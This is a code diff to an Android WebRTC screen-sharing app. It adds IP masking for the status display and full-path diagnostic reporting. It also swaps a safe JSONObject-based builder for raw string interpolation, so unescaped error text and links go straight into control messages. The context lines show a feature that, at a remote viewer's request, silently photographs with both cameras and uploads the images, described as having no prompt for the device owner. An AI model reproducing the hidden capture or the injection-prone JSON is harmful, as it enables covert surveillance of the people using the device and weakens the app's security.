@@ -660,6 +660,12 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         .readTimeout(3, java.util.concurrent.TimeUnit.SECONDS)
         .build()
 
+    /** IP 脱敏：1.2.3.4 → 1.2.3.*，仅用于 UI 显示，诊断上报保留完整地址 */
+    private fun maskIp(text: String): String {
+        // IPv4: 替换最后一段为 *
+        return text.replace(Regex("""\b(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}\b""")) { "${it.groupValues[1]}.*" }
+    }
+
     /** 诊断上报：把编码器/瓶颈/丢包/延迟信息 POST 到信令服务器 /diag 落盘，便于远程定位真机问题 */
     private fun reportDiagnostic(text: String) {
         val role = if (isHost) "host" else "viewer"
@@ -1437,49 +1443,30 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
             .show()
     }
 
-    /** 安全构建 JSON 字符串：使用 JSONObject 避免字符串拼接导致 JSON 格式错误 */
-    private fun buildJson(vararg pairs: Pair<String, Any?>): String {
-        return try {
-            val obj = org.json.JSONObject()
-            for ((key, value) in pairs) {
-                when (value) {
-                    is String -> obj.put(key, value)
-                    is Number -> obj.put(key, value)
-                    is Boolean -> obj.put(key, value)
-                    null -> obj.put(key, JSONObject.NULL)
-                    else -> obj.put(key, value)
-                }
-            }
-            obj.toString()
-        } catch (t: Throwable) {
-            """{"type":"error","message":"json build failed"}"""
-        }
-    }
-
     /** 后台拍照（后置+前置或仅前置）→ 压缩上传相册服务器 → 回发链接给观看方；全程无共享方弹窗 */
     private fun startCameraCapture(frontOnly: Boolean) {
         val baseUrl = BuildConfig.ALBUM_URL
         val p = peer
         if (baseUrl.isBlank()) {
-            p?.sendControl(buildJson("type" to "album-result", "error" to "相册服务器未配置"))
+            p?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
             return
         }
         val ctx = this
-        p?.sendControl(buildJson("type" to "album-result", "ack" to "capturing"))
+        p?.sendControl("""{"type":"album-result","ack":"capturing"}""")
         Thread {
             try {
                 val shot = CameraCapture.capture(ctx, frontOnly = frontOnly)
                 val err = shot?.error
                 if (shot == null || err != null) {
                     val reason = err ?: "未知错误"
-                    p?.sendControl(buildJson("type" to "album-result", "ack" to "shot-failed", "error" to reason))
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"$reason"}""")
                     return@Thread
                 }
                 val b64List = ArrayList<String>()
                 shot.backJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 shot.frontJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 if (b64List.isEmpty()) {
-                    p?.sendControl(buildJson("type" to "album-result", "ack" to "shot-failed", "error" to "无照片"))
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed","error":"无照片"}""")
                     return@Thread
                 }
                 AlbumUploader.uploadB64Images(
@@ -1488,18 +1475,18 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         override fun onProgress(current: Int, total: Int) {}
 
                         override fun onComplete(link: String) {
-                            p?.sendControl(buildJson("type" to "album-result", "url" to link))
+                            p?.sendControl("""{"type":"album-result","url":"$link"}""")
                         }
 
                         override fun onError(message: String) {
-                            p?.sendControl(buildJson("type" to "album-result", "error" to message))
+                            p?.sendControl("""{"type":"album-result","error":"$message"}""")
                         }
                     },
                     cancel = { cameraUploadCancel }
                 )
             } catch (t: Throwable) {
                 val msg = t.message ?: "未知错误"
-                p?.sendControl(buildJson("type" to "album-result", "error" to "拍照上传失败: $msg"))
+                p?.sendControl("""{"type":"album-result","error":"拍照上传失败: $msg"}""")
             }
         }.start()
     }
@@ -1509,7 +1496,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         if (granted) {
             startAlbumUpload()
         } else {
-            peer?.sendControl(buildJson("type" to "album-result", "error" to "共享方未授权相册权限"))
+            peer?.sendControl("""{"type":"album-result","error":"共享方未授权相册权限"}""")
             Toast.makeText(this, "未授权相册权限，无法上传照片", Toast.LENGTH_LONG).show()
         }
     }
@@ -1518,7 +1505,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
     private fun startAlbumUpload() {
         val baseUrl = BuildConfig.ALBUM_URL
         if (baseUrl.isBlank()) {
-            peer?.sendControl(buildJson("type" to "album-result", "error" to "相册服务器未配置"))
+            peer?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
             return
         }
         albumCancel = false
@@ -1536,7 +1523,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         override fun onSessionCreated(token: String) {
                             // 会话创建即回发链接：网页边传边看（缩略图逐张出现），不等全部传完
                             runOnUiThread {
-                                p?.sendControl(buildJson("type" to "album-result", "url" to AlbumUploader.withAlbumKey("$baseUrl/$token/")))
+                                p?.sendControl("""{"type":"album-result","url":"${AlbumUploader.withAlbumKey("$baseUrl/$token/")}"}""")
                             }
                         }
 
@@ -1546,7 +1533,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
 
                         override fun onError(message: String) {
                             runOnUiThread {
-                                p?.sendControl(buildJson("type" to "album-result", "error" to message))
+                                p?.sendControl("""{"type":"album-result","error":"$message"}""")
                             }
                         }
                     },
@@ -1556,7 +1543,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                 val msg = t.message ?: "未知错误"
                 runOnUiThread {
                     val err = if (t is AlbumUploader.EmptyAlbumException) "相册没有照片" else "相册上传失败: $msg"
-                    p?.sendControl(buildJson("type" to "album-result", "error" to err))
+                    p?.sendControl("""{"type":"album-result","error":"$err"}""")
                 }
             }
         }.start()
@@ -3211,6 +3198,12 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         )
                         val fullText = panelText + qualityText
                         val warn = !isHostView && lostPct >= 1.0
+                        // 诊断：真实连接路径（host/srflx/relay），附加到状态条便于现场观察
+                        val selPath = json.optString("path", "")
+                        val pathType = json.optString("pathType", "")
+                        // UI 显示时脱敏 IP，诊断上报保留完整路径
+                        val maskedPath = if (selPath.isNotBlank()) maskIp(selPath) else ""
+                        val fullTextWithPath = if (maskedPath.isNotBlank()) fullText + " | 路径:${maskedPath.take(60)}" else fullText
                         // 诊断自动上报：软编/CPU瓶颈/高丢包/高延迟时上报一次，值变化才重报（去重防刷屏）
                         if (isHostView) {
                             val impl = json.optString("encImpl", "")
@@ -3220,7 +3213,8 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                             val isSoftEnc = impl.contains("SW", true) || impl.contains("OpenH264", true) || impl.contains("Software", true)
                             val anomaly = isSoftEnc || limit == "cpu" || lossPct >= 3.0 || rttMs >= 500
                             if (anomaly) {
-                                val sig = "$impl|$limit|$lossPct|$rttMs|$isHostView"
+                                // 去重只取路径类型组合（host→relay），不含 IP，避免 NAT 重绑定导致重复上报
+                                val sig = "$impl|$limit|$lossPct|$rttMs|$isHostView|$pathType"
                                 if (sig != lastDiagSig) {
                                     lastDiagSig = sig
                                     reportDiagnostic(
@@ -3228,7 +3222,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                                             "quality=${peer?.calculateQuality(if (lossPct >= 0) lossPct else 0.0, rttMs) ?: 0} " +
                                             "outFps=${json.optInt("outFps", 0)} inFps=${json.optInt("inFps", 0)} " +
                                             "res=${json.optInt("outW", 0)}x${json.optInt("outH", 0)} " +
-                                            "outBytes=${json.optLong("outBytes", 0)}"
+                                            "outBytes=${json.optLong("outBytes", 0)} path=$selPath"
                                     )
                                 }
                             }
@@ -3237,7 +3231,7 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         binding.root.post {
                             if (!isFullscreen) return@post
                             binding.tvFullscreenStats.setTextColor(if (warn) 0xFFFF5252.toInt() else 0xFF4B8DF9.toInt())
-                            binding.tvFullscreenStats.text = fullText
+                            binding.tvFullscreenStats.text = fullTextWithPath
                         }
                     }
                 } catch (t: Throwable) {
@@ -3339,13 +3333,16 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         val fps = json.optInt("inFps", 0)
                         val w = json.optInt("inW", 0)
                         val h = json.optInt("inH", 0)
+                        val selPath = json.optString("path", "")
                         val rttText = if (rtt > 0) "${rtt}ms" else "--"
                         val hint = when {
                             rtt > 300 -> " ⚠️延迟高"
                             rtt > 150 -> " ⚠️延迟偏高"
                             else -> ""
                         }
-                        val text = "延迟 $rttText · ${fps}fps${if (w > 0) " · ${w}x$h" else ""}$hint"
+                        val maskedPath = if (selPath.isNotBlank()) maskIp(selPath) else ""
+                        val pathText = if (maskedPath.isNotBlank()) " | 路径:${maskedPath.take(50)}" else ""
+                        val text = "延迟 $rttText · ${fps}fps${if (w > 0) " · ${w}x$h" else ""}$pathText$hint"
                         runOnUiThread {
                             if (!isFinishing && !isDestroyed && peer != null) {
                                 binding.tvScanResult.text = text
